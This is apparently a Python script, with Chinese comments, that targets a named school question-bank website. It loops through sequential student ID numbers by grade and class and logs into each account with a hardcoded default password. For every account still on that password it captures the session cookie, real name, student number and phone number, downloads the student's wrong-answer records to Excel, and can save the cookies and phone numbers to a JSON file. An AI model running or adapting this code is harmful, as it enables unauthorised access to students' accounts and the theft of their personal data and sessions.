import requests
import json
import openpyxl
import os.path
import re
from time import sleep

login_url = "http://guettx.gstar-info.com:6060/Token"
tiku_url = "http://guettx.gstar-info.com:6060/api/Errors"

headersNoCookie = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "Connection": "keep-alive",
    "Host": "guettx.gstar-info.com:6060",
    "Origin": "http://guettx.gstar-info.com:6060",
    "Referer": "http://guettx.gstar-info.com:6060/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1660.14"
}

headersInCookie = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "Connection": "keep-alive",
    "Host": "guettx.gstar-info.com:6060",
    "Origin": "http://guettx.gstar-info.com:6060",
    "Referer": "http://guettx.gstar-info.com:6060/",
    "Cookie": "",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1660.14"
}

payload = {
    "grant_type": "password",
    "username": "",
    "password": "ebCP/Ukx8gRnEbySa7MVxg=="
}

max_page = 15 # 默认错题集最大页数
columns = ["QNumber", "CourseName", "CourseExperName", "UsageScenario", "AnswerType", "Question", "Answer", "OptionA", "OptionB", "OptionC", "OptionD"]

# 初识化Excel文件
def init_excel(file_name):
    # 判断文件是否存在，若不存在则新建一个excel文件
    if os.path.isfile(file_name):
        os.remove(file_name)
    workbook = openpyxl.Workbook()
    worksheet = workbook.active
    worksheet.append(columns)
    print(f"\n[CMD]'{file_name}'表格初识化完毕,正在下载数据...")
    return worksheet, workbook

# 爬取错题集转换为Excel文件
def spider(max_page, worksheet, token):
    headersInCookie['Cookie'] = token
    for page in range(1, max_page):
        response = requests.get(url=f"{tiku_url}?p={page}&page=my&search=true", headers=headersInCookie)
        # 将获取到的json文件转换为字典
        result_dict = json.loads(response.text)['Result']
        output_data = []
        # 提取字典中需要的数据
        if not result_dict['Data']:
            print(f'[CMD]数据提取完毕，共提取{page}页数据，正在保存数据...')
            return
        for data in result_dict['Data']:
            temp_dict = {}
            for key, value in data.items():
                if isinstance(value, str) and "<p>" in value:
                    # 判断字符串中是否有<p>标签，如果有则提取<p>.*</p>中间的值
                    if re.search('<p><span[^>]*>(.*?)</span></p>', value): # 如果字符串中有<p>.*</p><p>xx</p>，则先提取第一个<p>.*</p>的值
                        value = re.findall('<p><span[^>]*>(.*?)</span></p>', value)[0]
                    elif re.search('<p>.*</p>', value):
                        value = re.findall('<p>(.*?)</p>', value)[0]
                    if "&gt;" in value:
                        # 替换&gt;为>
                        value = value.replace("&gt;", ">")
                temp_dict[key] = value
            # print(temp_dict)
            output_data.append(temp_dict)
        # 将数据存放在Excel表格中
        for item in output_data:
            row = []
            for column in columns:
                row.append(item.get(column, ""))
            worksheet.append(row)

# 获取用户Cookie并下载题库
def main(saveFile=False, nianji=19, classFrom=1, classTo=2, downloadErrorFile=True):
    global max_page
    allData_dict = {}
    for c in range(classFrom, classTo+1):
        classData_list = []
        print(f"\n[CMD]正在获取班级[{nianji*1000000+2000+c}】的错题集...")
        for i in range(nianji*100000000+200001+c*100, nianji*100000000+200036+c*100):
            payload["username"] = str(i)
            response = requests.post(login_url, headers=headersNoCookie, data=payload)
            response_json = response.json()
            if "access_token" not in response_json:
                print(f"[Error]:【{i}】用户修改了默认密码！")
            else:
                data_dict = {}  # 用于保存每个用户的数据
                data_dict["cookie"] = response.headers.get('Set-Cookie')
                data_dict["realname"] = response_json["realname"]
                data_dict["userno"] = response_json["userno"]
                if response_json.get("phone", ""):
                    data_dict["phone"] = response_json["phone"]
                if downloadErrorFile:
                    file_name = f'{data_dict["userno"]}{data_dict["realname"]}_通源错题.xlsx'
                    worksheet, workbook = init_excel(file_name)
                    spider(max_page, worksheet, data_dict["cookie"])
                    workbook.save(file_name)
                    workbook.close()
                    print(f"[CMD]数据成功保存在'./{file_name}'！\n")
                classData_list.append(data_dict)
                # print(data_dict)
            sleep(1)
        # 将字典数据转换为列表，并将key值修改为"1900200x"
        allData_dict[f"{19002000+c}"] = classData_list
    if saveFile:
        # 将数据保存到json文件中
        with open('data.json', 'w') as f:
            json.dump(allData_dict, f, ensure_ascii=True)

if __name__ == "__main__":
    saveFile = False
    print("""
------------------------- 通源题库Spider -----------------------------
>           欢迎使用通源题库爬虫脚本，本脚本为个人学习项目
>           若有任何违规违法行为，作者不承担任何法律义务
>           如有违规，请联系作者QQ755327573\n
""")
    while True:
        nianji = input(">请输入你要爬取的年级(如19): ")
        if nianji != '':
            nianji = int(nianji)
            break
    while True:
        banji = input(">请输入你要爬取的最小-最大班级(如1-10): ").split('-')
        if banji != '':
            classFrom = int(banji[0])
            classTo = int(banji[1])
            break
    if input("是否保存用户的数据文件(默认为不保存,回车即为默认,回复yes确认保存): "):
       print("\n文件将存储在./date.json中\n\033[1;31;40m【注】数据文件不是题库文件,包含cookie和电话号码,请勿用于违法用途！\033[0m")
       saveFile = True
    main(saveFile, nianji, classFrom, classTo)
    # main()


